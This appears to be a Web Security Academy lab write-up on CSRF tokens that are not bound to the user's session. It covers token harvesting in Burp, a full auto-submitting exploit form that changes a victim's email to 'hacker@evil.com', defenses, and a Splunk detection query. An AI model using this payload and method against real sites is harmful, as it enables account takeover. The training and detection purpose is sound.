## 1. Vulnerability Architecture & Mechanism

Cross-Site Request Forgery (CSRF) occurs when a malicious website causes a user's web browser to perform an unwanted action on a trusted site where the user is currently authenticated. To prevent this, applications use anti-CSRF tokens—unpredictable, server-generated secrets required for state-changing requests.

* **The Core Flaw:** The application correctly implements anti-CSRF tokens to prevent blind request forgery. However, the backend validation logic is incomplete. The server verifies that the submitted CSRF token is mathematically valid and exists in its database, but it fails to verify that the token was explicitly issued to the *currently authenticated session*.
* **The Mechanism:** An attacker logs into their own account, requests a state-changing page, and captures a valid CSRF token generated for them. They do not use this token. Instead, they embed this unused, valid token into a malicious HTML form and deliver it to the victim. When the victim submits the form, the server sees a valid session cookie (the victim's) and a valid CSRF token (the attacker's). Because the server doesn't check if they match, the request succeeds.
* **Real-World Analogy:** A concert venue issues unforgeable, cryptographic tickets (CSRF tokens) and requires you to show your ID (Session Cookie) at the door. However, the bouncer only checks two things independently: "Is this ID real?" (Yes) and "Is this ticket real?" (Yes). The bouncer never checks if the name on the ticket matches the ID. An attacker can buy a valid ticket, hand it to someone else, and that person can walk right in.

## 3. Step-by-Step Exploitation Flow

### Phase 1: Reconnaissance & Token Harvesting

* Log into the application using your primary account (`wiener:peter`).
* Navigate to the "Update email" form.
* Submit an email change and intercept the `POST /my-account/change-email` request in Burp Proxy.
* *Action:* Copy the value of the `csrf` parameter (e.g., `a1b2c3d4...`). Immediately drop the request so the token remains unused and valid on the server.

### Phase 2: Vulnerability Validation (Cross-Account Testing)

* Open a Private/Incognito browser window and log in as the secondary user (`carlos:montoya`).
* Submit an email change for Carlos and intercept the request.
* *Action:* In Burp Repeater, replace Carlos's legitimate `csrf` token with the token you harvested from Wiener's session. Send the request.
* *Result:* `HTTP 302 Found`. The email is successfully changed, proving the tokens are not tied to the session.

### Phase 3: Weaponization

* Construct the CSRF HTML payload. The form must target the vulnerable endpoint, include the desired email change, and inject a fresh, unused CSRF token harvested from your account.

**Constructed Exploit HTML:**

```html
<!DOCTYPE html>
<html>
  <body>
    <!-- The form points to the vulnerable endpoint -->
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <!-- Attacker-controlled email -->
      <input type="hidden" name="email" value="hacker@evil.com" />
      <!-- Harvested CSRF token from the attacker's session -->
      <input type="hidden" name="csrf" value="YOUR_HARVESTED_TOKEN_HERE" />
    </form>
    
    <!-- Auto-submit the form as soon as the page loads -->
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```

### Phase 4: Delivery

* Harvest one final, fresh token from Wiener's account.
* Paste the constructed HTML into the Exploit Server, inserting the fresh token.
* Click "Deliver exploit to victim".
* *Result:* The victim visits the page, their browser submits the form with their session cookies and your token, and the backend processes the malicious state change.

## 4. Execution Insight: The "Token Pool" Anti-Pattern

This vulnerability arises from a specific architectural anti-pattern often found in custom-built web frameworks: the **Global Token Pool**.

Instead of storing the CSRF token inside the user's session object (e.g., `$_SESSION['csrf_token'] = $token`), the developers store all generated tokens in a central database table or cache (e.g., a `valid_csrf_tokens` table).

When a request arrives, the backend queries: `SELECT * FROM valid_csrf_tokens WHERE token = ?`. If it returns a result, the request is authorized. Because the database schema does not enforce a foreign key relationship between the token and a specific `user_id` or `session_id`, the validation logic is fundamentally decoupled from identity, defeating the entire purpose of CSRF protection.

## 5. Defense, Hardening & Secure Coding

To effectively prevent CSRF, tokens must be cryptographically tied to the user's current session.

* **Synchronizer Token Pattern (Primary Defense):** The industry standard defense.
1. Upon session creation, generate a strong, cryptographically random token.
2. Store this token *inside* the user's server-side session data.
3. Emit this token into hidden fields on state-changing forms.
4. On submission, the server strictly compares the submitted token against the token stored in *that specific user's* session. If they do not match exactly, reject the request.


* **Double Submit Cookie Pattern:** If server-side state is impossible (e.g., stateless APIs), the server issues a random CSRF token as a cookie, and the frontend JS reads that cookie and submits it as a hidden form value. The server verifies that the cookie value matches the form value. (Note: This is less secure than Synchronizer Tokens and can be vulnerable to sub-domain cookie injection).
* **SameSite Cookie Attribute (Defense in Depth):** Set all session cookies to `SameSite=Lax` or `SameSite=Strict`. This instructs the browser not to send the session cookie on cross-site POST requests. While this heavily mitigates traditional CSRF, it should be used in conjunction with tokens, not as a complete replacement, due to older browser compatibility and specific bypass scenarios.

## 6. SIEM Detection & Telemetry Analysis

Detecting decoupled token CSRF requires analyzing token lifecycles and source IP anomalies.

### Splunk Search Query (SPL)

```spl
index=web_application sourcetype=app_logs uri_path="/my-account/change-email" method=POST
| stats dc(session_id) as distinct_sessions, values(src_ip) as IPs by csrf_token
| where distinct_sessions > 1

```

*Indicator of Attack (IoA):* The most definitive signature for this attack is a single CSRF token being used by two distinctly different `session_id`s. Because a token should be uniquely mapped 1:1 with a session, a collision indicates an attacker harvested a token and a victim consumed it.

## 7. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Lab doesn't solve / 403 Forbidden** | Token Consumption. | Tokens in this lab are single-use. If you intercepted the request, harvested the token, but accidentally *forwarded* the request instead of dropping it, the server consumed the token. You must drop the request to keep the token fresh for the exploit server. |
| **Email fails to change in exploit server test** | Email uniqueness constraint. | The lab hint explicitly states you cannot use an email already taken by another user. If you changed Carlos's email to `test@test.com` during testing, you must use a different email (e.g., `hacker2@evil.com`) for the final payload. |
| **Browser blocks the automatic form submission** | Popup/Script Blockers. | If testing locally, ensure you don't have aggressive script blockers (like NoScript) preventing the inline `<script>document.forms[0].submit()</script>` from executing. |

---

> **Key Insight:** Security controls fail when identity and authorization are decoupled. A CSRF token is not a password; its strength does not come from its complexity alone, but from its strict, cryptographically enforced binding to a single, authenticated user session.
